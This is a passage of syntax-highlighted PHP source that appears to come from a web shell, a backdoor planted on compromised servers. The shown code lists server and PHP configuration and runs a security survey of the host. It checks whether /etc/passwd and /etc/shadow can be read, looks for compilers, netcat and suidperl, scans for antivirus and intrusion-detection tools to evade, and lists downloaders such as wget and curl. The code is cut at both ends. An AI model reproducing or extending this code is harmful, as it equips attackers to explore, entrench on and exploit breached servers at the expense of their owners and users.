<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">7</span> =&gt; <span style="color: #eeeeec; background-color: #2e3436;">array(</span><span style="color: #ad7fa8; font-style: italic;">'Server Web Port'</span>,$<span style="color: #8ae234;">_SERVER</span>[<span style="color: #ad7fa8; font-style: italic;">'SERVER_PORT'</span>]),
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">8</span> =&gt; <span style="color: #eeeeec; background-color: #2e3436;">array(</span><span style="color: #ad7fa8; font-style: italic;">'PHP run mode'</span>,<span style="color: #eeeeec; background-color: #2e3436;">strtoupper(php_sapi_name(</span>))),
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">9</span> =&gt; <span style="color: #eeeeec; background-color: #2e3436;">array(</span><span style="color: #ad7fa8; font-style: italic;">'The file path'</span>,<span style="color: #8ae234;">__FILE__</span>),

<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">10</span> =&gt; <span style="color: #eeeeec; background-color: #2e3436;">array(</span><span style="color: #ad7fa8; font-style: italic;">'PHP Version'</span>,<span style="color: #8ae234;">PHP_VERSION</span>),
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">11</span> =&gt; <span style="color: #eeeeec; background-color: #2e3436;">array(</span><span style="color: #ad7fa8; font-style: italic;">'PHPINFO'</span>,(<span style="color: #f57900; font-weight: bold;">IS_PHPINFO</span> ? <span style="color: #ad7fa8; font-style: italic;">'&lt;a href="javascript:g(\'phpinfo\');"&gt;Yes&lt;/a&gt;'</span> : <span style="color: #ad7fa8; font-style: italic;">'No'</span>)),
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">12</span> =&gt; <span style="color: #eeeeec; background-color: #2e3436;">array(</span><span style="color: #ad7fa8; font-style: italic;">'Safe Mode'</span>,<span style="color: #eeeeec; background-color: #2e3436;">getcfg(</span><span style="color: #ad7fa8; font-style: italic;">'safe_mode'</span>)),
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">13</span> =&gt; <span style="color: #eeeeec; background-color: #2e3436;">array(</span><span style="color: #ad7fa8; font-style: italic;">'Administrator'</span>,$<span style="color: #eeeeec;">adminmail</span>),
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">14</span> =&gt; <span style="color: #eeeeec; background-color: #2e3436;">array(</span><span style="color: #ad7fa8; font-style: italic;">'allow_url_fopen'</span>,<span style="color: #eeeeec; background-color: #2e3436;">getcfg(</span><span style="color: #ad7fa8; font-style: italic;">'allow_url_fopen'</span>)),
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">15</span> =&gt; <span style="color: #eeeeec; background-color: #2e3436;">array(</span><span style="color: #ad7fa8; font-style: italic;">'enable_dl'</span>,<span style="color: #eeeeec; background-color: #2e3436;">getcfg(</span><span style="color: #ad7fa8; font-style: italic;">'enable_dl'</span>)),
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">16</span> =&gt; <span style="color: #eeeeec; background-color: #2e3436;">array(</span><span style="color: #ad7fa8; font-style: italic;">'display_errors'</span>,<span style="color: #eeeeec; background-color: #2e3436;">getcfg(</span><span style="color: #ad7fa8; font-style: italic;">'display_errors'</span>)),
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">17</span> =&gt; <span style="color: #eeeeec; background-color: #2e3436;">array(</span><span style="color: #ad7fa8; font-style: italic;">'register_globals'</span>,<span style="color: #eeeeec; background-color: #2e3436;">getcfg(</span><span style="color: #ad7fa8; font-style: italic;">'register_globals'</span>)),
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">18</span> =&gt; <span style="color: #eeeeec; background-color: #2e3436;">array(</span><span style="color: #ad7fa8; font-style: italic;">'magic_quotes_gpc'</span>,<span style="color: #eeeeec; background-color: #2e3436;">getcfg(</span><span style="color: #ad7fa8; font-style: italic;">'magic_quotes_gpc'</span>)),
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">19</span> =&gt; <span style="color: #eeeeec; background-color: #2e3436;">array(</span><span style="color: #ad7fa8; font-style: italic;">'memory_limit'</span>,<span style="color: #eeeeec; background-color: #2e3436;">getcfg(</span><span style="color: #ad7fa8; font-style: italic;">'memory_limit'</span>)),
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">20</span> =&gt; <span style="color: #eeeeec; background-color: #2e3436;">array(</span><span style="color: #ad7fa8; font-style: italic;">'post_max_size'</span>,<span style="color: #eeeeec; background-color: #2e3436;">getcfg(</span><span style="color: #ad7fa8; font-style: italic;">'post_max_size'</span>)),
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">21</span> =&gt; <span style="color: #eeeeec; background-color: #2e3436;">array(</span><span style="color: #ad7fa8; font-style: italic;">'upload_max_filesize'</span>,$<span style="color: #eeeeec;">upsize</span>),
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">22</span> =&gt; <span style="color: #eeeeec; background-color: #2e3436;">array(</span><span style="color: #ad7fa8; font-style: italic;">'max_execution_time'</span>,<span style="color: #eeeeec; background-color: #2e3436;">getcfg(</span><span style="color: #ad7fa8; font-style: italic;">'max_execution_time'</span>).<span style="color: #ad7fa8; font-style: italic;">' second(s)'</span>),
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">23</span> =&gt; <span style="color: #eeeeec; background-color: #2e3436;">array(</span><span style="color: #ad7fa8; font-style: italic;">'disable_functions'</span>,$<span style="color: #eeeeec;">dis_func</span>),
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> );

<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span>($<span style="color: #eeeeec;">phpvarname</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">m(</span>$<span style="color: #eeeeec;">phpvarname</span> .<span style="color: #ad7fa8; font-style: italic;">' : '</span>.<span style="color: #eeeeec; background-color: #2e3436;">getcfg(</span>$<span style="color: #eeeeec;">phpvarname</span>));
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }

<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">formhead(array(</span><span style="color: #ad7fa8; font-style: italic;">'title'</span>=&gt;<span style="color: #ad7fa8; font-style: italic;">'Server environment'</span>));
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">makehide(</span><span style="color: #ad7fa8; font-style: italic;">'action'</span>,<span style="color: #ad7fa8; font-style: italic;">'phpenv'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">makeinput(array(</span><span style="color: #ad7fa8; font-style: italic;">'title'</span>=&gt;<span style="color: #ad7fa8; font-style: italic;">'Please input PHP configuration parameter(eg:magic_quotes_gpc)'</span>,<span style="color: #ad7fa8; font-style: italic;">'name'</span>=&gt;<span style="color: #ad7fa8; font-style: italic;">'phpvarname'</span>,<span style="color: #ad7fa8; font-style: italic;">'value'</span>=&gt;$<span style="color: #eeeeec;">phpvarname</span>,<span style="color: #ad7fa8; font-style: italic;">'newline'</span>=&gt;<span style="color: #eeeeec; background-color: #2e3436;">1</span>));
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">formfooter(</span>);

<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">hp</span> = <span style="color: #eeeeec; background-color: #2e3436;">array(0</span>=&gt; <span style="color: #ad7fa8; font-style: italic;">'Server'</span>, <span style="color: #eeeeec; background-color: #2e3436;">1</span>=&gt; <span style="color: #ad7fa8; font-style: italic;">'PHP'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">for</span>($<span style="color: #eeeeec;">a</span>=<span style="color: #eeeeec; background-color: #2e3436;">0</span>;$<span style="color: #eeeeec;">a</span>&lt;<span style="color: #eeeeec; background-color: #2e3436;">2</span>;$<span style="color: #eeeeec;">a</span>++) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;h2&gt;'</span>.$<span style="color: #eeeeec;">hp</span>[$<span style="color: #eeeeec;">a</span>].<span style="color: #ad7fa8; font-style: italic;">' &amp;raquo;&lt;/h2&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;ul class="info"&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span> ($<span style="color: #eeeeec;">a</span>==<span style="color: #eeeeec; background-color: #2e3436;">0</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">for</span>($<span style="color: #eeeeec;">i</span>=<span style="color: #eeeeec; background-color: #2e3436;">1</span>;$<span style="color: #eeeeec;">i</span>&lt;=<span style="color: #eeeeec; background-color: #2e3436;">9</span>;$<span style="color: #eeeeec;">i</span>++) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;li&gt;&lt;u&gt;'</span>.$<span style="color: #eeeeec;">info</span>[$<span style="color: #eeeeec;">i</span>][<span style="color: #eeeeec; background-color: #2e3436;">0</span>].<span style="color: #ad7fa8; font-style: italic;">':&lt;/u&gt;'</span>.$<span style="color: #eeeeec;">info</span>[$<span style="color: #eeeeec;">i</span>][<span style="color: #eeeeec; background-color: #2e3436;">1</span>].<span style="color: #ad7fa8; font-style: italic;">'&lt;/li&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> } <span style="color: #729fcf; font-weight: bold;">elseif</span> ($<span style="color: #eeeeec;">a</span> == <span style="color: #eeeeec; background-color: #2e3436;">1</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">for</span>($<span style="color: #eeeeec;">i</span>=<span style="color: #eeeeec; background-color: #2e3436;">10</span>;$<span style="color: #eeeeec;">i</span>&lt;=<span style="color: #eeeeec; background-color: #2e3436;">23</span>;$<span style="color: #eeeeec;">i</span>++) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;li&gt;&lt;u&gt;'</span>.$<span style="color: #eeeeec;">info</span>[$<span style="color: #eeeeec;">i</span>][<span style="color: #eeeeec; background-color: #2e3436;">0</span>].<span style="color: #ad7fa8; font-style: italic;">':&lt;/u&gt;'</span>.$<span style="color: #eeeeec;">info</span>[$<span style="color: #eeeeec;">i</span>][<span style="color: #eeeeec; background-color: #2e3436;">1</span>].<span style="color: #ad7fa8; font-style: italic;">'&lt;/li&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;/ul&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
}<span style="color: #888a85;">//</span><span style="color: #888a85;">end phpenv</span>

<span style="color: #729fcf; font-weight: bold;">elseif</span> ($<span style="color: #eeeeec;">action</span> == <span style="color: #ad7fa8; font-style: italic;">'secinfo'</span>) {

<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">secparam(</span><span style="color: #ad7fa8; font-style: italic;">'Server software'</span>, @<span style="color: #eeeeec; background-color: #2e3436;">getenv(</span><span style="color: #ad7fa8; font-style: italic;">'SERVER_SOFTWARE'</span>));
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">secparam(</span><span style="color: #ad7fa8; font-style: italic;">'Disabled PHP Functions'</span>, ($<span style="color: #8ae234;">GLOBALS</span>[<span style="color: #ad7fa8; font-style: italic;">'disable_functions'</span>])?$<span style="color: #8ae234;">GLOBALS</span>[<span style="color: #ad7fa8; font-style: italic;">'disable_functions'</span>]:<span style="color: #ad7fa8; font-style: italic;">'none'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">secparam(</span><span style="color: #ad7fa8; font-style: italic;">'Open base dir'</span>, @<span style="color: #eeeeec; background-color: #2e3436;">ini_get(</span><span style="color: #ad7fa8; font-style: italic;">'open_basedir'</span>));
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">secparam(</span><span style="color: #ad7fa8; font-style: italic;">'Safe mode exec dir'</span>, @<span style="color: #eeeeec; background-color: #2e3436;">ini_get(</span><span style="color: #ad7fa8; font-style: italic;">'safe_mode_exec_dir'</span>));
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">secparam(</span><span style="color: #ad7fa8; font-style: italic;">'Safe mode include dir'</span>, @<span style="color: #eeeeec; background-color: #2e3436;">ini_get(</span><span style="color: #ad7fa8; font-style: italic;">'safe_mode_include_dir'</span>));
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">secparam(</span><span style="color: #ad7fa8; font-style: italic;">'cURL support'</span>, <span style="color: #eeeeec; background-color: #2e3436;">function_exists(</span><span style="color: #ad7fa8; font-style: italic;">'curl_version'</span>)?<span style="color: #ad7fa8; font-style: italic;">'enabled'</span>:<span style="color: #ad7fa8; font-style: italic;">'no'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">temp</span>=<span style="color: #eeeeec; background-color: #2e3436;">array(</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span>(<span style="color: #eeeeec; background-color: #2e3436;">function_exists(</span><span style="color: #ad7fa8; font-style: italic;">'mysql_get_client_info'</span>))
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">temp</span>[] = <span style="color: #ad7fa8; font-style: italic;">"MySql ("</span>.<span style="color: #eeeeec; background-color: #2e3436;">mysql_get_client_info(</span>).<span style="color: #ad7fa8; font-style: italic;">")"</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span>(<span style="color: #eeeeec; background-color: #2e3436;">function_exists(</span><span style="color: #ad7fa8; font-style: italic;">'mssql_connect'</span>))
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">temp</span>[] = <span style="color: #ad7fa8; font-style: italic;">"MSSQL"</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span>(<span style="color: #eeeeec; background-color: #2e3436;">function_exists(</span><span style="color: #ad7fa8; font-style: italic;">'pg_connect'</span>))
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">temp</span>[] = <span style="color: #ad7fa8; font-style: italic;">"PostgreSQL"</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span>(<span style="color: #eeeeec; background-color: #2e3436;">function_exists(</span><span style="color: #ad7fa8; font-style: italic;">'oci_connect'</span>))
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">temp</span>[] = <span style="color: #ad7fa8; font-style: italic;">"Oracle"</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">secparam(</span><span style="color: #ad7fa8; font-style: italic;">'Supported databases'</span>, <span style="color: #eeeeec; background-color: #2e3436;">implode(</span><span style="color: #ad7fa8; font-style: italic;">', '</span>, $<span style="color: #eeeeec;">temp</span>));

<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span>( !<span style="color: #f57900; font-weight: bold;">IS_WIN</span> ) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">userful</span> = <span style="color: #eeeeec; background-color: #2e3436;">array(</span><span style="color: #ad7fa8; font-style: italic;">'gcc'</span>,<span style="color: #ad7fa8; font-style: italic;">'lcc'</span>,<span style="color: #ad7fa8; font-style: italic;">'cc'</span>,<span style="color: #ad7fa8; font-style: italic;">'ld'</span>,<span style="color: #ad7fa8; font-style: italic;">'make'</span>,<span style="color: #ad7fa8; font-style: italic;">'php'</span>,<span style="color: #ad7fa8; font-style: italic;">'perl'</span>,<span style="color: #ad7fa8; font-style: italic;">'python'</span>,<span style="color: #ad7fa8; font-style: italic;">'ruby'</span>,<span style="color: #ad7fa8; font-style: italic;">'tar'</span>,<span style="color: #ad7fa8; font-style: italic;">'gzip'</span>,<span style="color: #ad7fa8; font-style: italic;">'bzip'</span>,<span style="color: #ad7fa8; font-style: italic;">'bzip2'</span>,<span style="color: #ad7fa8; font-style: italic;">'nc'</span>,<span style="color: #ad7fa8; font-style: italic;">'locate'</span>,<span style="color: #ad7fa8; font-style: italic;">'suidperl'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">danger</span> = <span style="color: #eeeeec; background-color: #2e3436;">array(</span><span style="color: #ad7fa8; font-style: italic;">'kav'</span>,<span style="color: #ad7fa8; font-style: italic;">'nod32'</span>,<span style="color: #ad7fa8; font-style: italic;">'bdcored'</span>,<span style="color: #ad7fa8; font-style: italic;">'uvscan'</span>,<span style="color: #ad7fa8; font-style: italic;">'sav'</span>,<span style="color: #ad7fa8; font-style: italic;">'drwebd'</span>,<span style="color: #ad7fa8; font-style: italic;">'clamd'</span>,<span style="color: #ad7fa8; font-style: italic;">'rkhunter'</span>,<span style="color: #ad7fa8; font-style: italic;">'chkrootkit'</span>,<span style="color: #ad7fa8; font-style: italic;">'iptables'</span>,<span style="color: #ad7fa8; font-style: italic;">'ipfw'</span>,<span style="color: #ad7fa8; font-style: italic;">'tripwire'</span>,<span style="color: #ad7fa8; font-style: italic;">'shieldcc'</span>,<span style="color: #ad7fa8; font-style: italic;">'portsentry'</span>,<span style="color: #ad7fa8; font-style: italic;">'snort'</span>,<span style="color: #ad7fa8; font-style: italic;">'ossec'</span>,<span style="color: #ad7fa8; font-style: italic;">'lidsadm'</span>,<span style="color: #ad7fa8; font-style: italic;">'tcplodg'</span>,<span style="color: #ad7fa8; font-style: italic;">'sxid'</span>,<span style="color: #ad7fa8; font-style: italic;">'logcheck'</span>,<span style="color: #ad7fa8; font-style: italic;">'logwatch'</span>,<span style="color: #ad7fa8; font-style: italic;">'sysmask'</span>,<span style="color: #ad7fa8; font-style: italic;">'zmbscap'</span>,<span style="color: #ad7fa8; font-style: italic;">'sawmill'</span>,<span style="color: #ad7fa8; font-style: italic;">'wormscan'</span>,<span style="color: #ad7fa8; font-style: italic;">'ninja'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">downloaders</span> = <span style="color: #eeeeec; background-color: #2e3436;">array(</span><span style="color: #ad7fa8; font-style: italic;">'wget'</span>,<span style="color: #ad7fa8; font-style: italic;">'fetch'</span>,<span style="color: #ad7fa8; font-style: italic;">'lynx'</span>,<span style="color: #ad7fa8; font-style: italic;">'links'</span>,<span style="color: #ad7fa8; font-style: italic;">'curl'</span>,<span style="color: #ad7fa8; font-style: italic;">'get'</span>,<span style="color: #ad7fa8; font-style: italic;">'lwp-mirror'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">secparam(</span><span style="color: #ad7fa8; font-style: italic;">'Readable /etc/passwd'</span>, @<span style="color: #eeeeec; background-color: #2e3436;">is_readable(</span><span style="color: #ad7fa8; font-style: italic;">'/etc/passwd'</span>) ? <span style="color: #ad7fa8; font-style: italic;">"yes"</span> : <span style="color: #ad7fa8; font-style: italic;">'no'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">secparam(</span><span style="color: #ad7fa8; font-style: italic;">'Readable /etc/shadow'</span>, @<span style="color: #eeeeec; background-color: #2e3436;">is_readable(</span><span style="color: #ad7fa8; font-style: italic;">'/etc/shadow'</span>) ? <span style="color: #ad7fa8; font-style: italic;">"yes"</span> : <span style="color: #ad7fa8; font-style: italic;">'no'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">secparam(</span><span style="color: #ad7fa8; font-style: italic;">'OS version'</span>, @<span style="color: #eeeeec; background-color: #2e3436;">file_get_contents(</span><span style="color: #ad7fa8; font-style: italic;">'/proc/version'</span>));
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">secparam(</span><span style="color: #ad7fa8; font-style: italic;">'Distr name'</span>, @<span style="color: #eeeeec; background-color: #2e3436;">file_get_contents(</span><span style="color: #ad7fa8; font-style: italic;">'/etc/issue.net'</span>));
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">safe_mode</span> = @<span style="color: #eeeeec; background-color: #2e3436;">ini_get(</span><span style="color: #ad7fa8; font-style: italic;">'safe_mode'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span>(!$<span style="color: #8ae234;">GLOBALS</span>[<span style="color: #ad7fa8; font-style: italic;">'safe_mode'</span>]) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">temp</span>=<span style="color: #eeeeec; background-color: #2e3436;">array(</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">foreach</span> ($<span style="color: #eeeeec;">userful</span> <span style="color: #729fcf; font-weight: bold;">as</span> $<span style="color: #eeeeec;">item</span>)
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span>(<span style="color: #eeeeec; background-color: #2e3436;">which(</span>$<span style="color: #eeeeec;">item</span>)){$<span style="color: #eeeeec;">temp</span>[]=$<span style="color: #eeeeec;">item</span>;}
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">secparam(</span><span style="color: #ad7fa8; font-style: italic;">'Userful'</span>, <span style="color: #eeeeec; background-color: #2e3436;">implode(</span><span style="color: #ad7fa8; font-style: italic;">', '</span>,$<span style="color: #eeeeec;">temp</span>));
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">temp</span>=<span style="color: #eeeeec; background-color: #2e3436;">array(</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">foreach</span> ($<span style="color: #eeeeec;">danger</span> <span style="color: #729fcf; font-weight: bold;">as</span> $<span style="color: #eeeeec;">item</span>)
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span>(<span style="color: #eeeeec; background-color: #2e3436;">which(</span>$<span style="color: #eeeeec;">item</span>)){$<span style="color: #eeeeec;">temp</span>[]=$<span style="color: #eeeeec;">item</span>;}
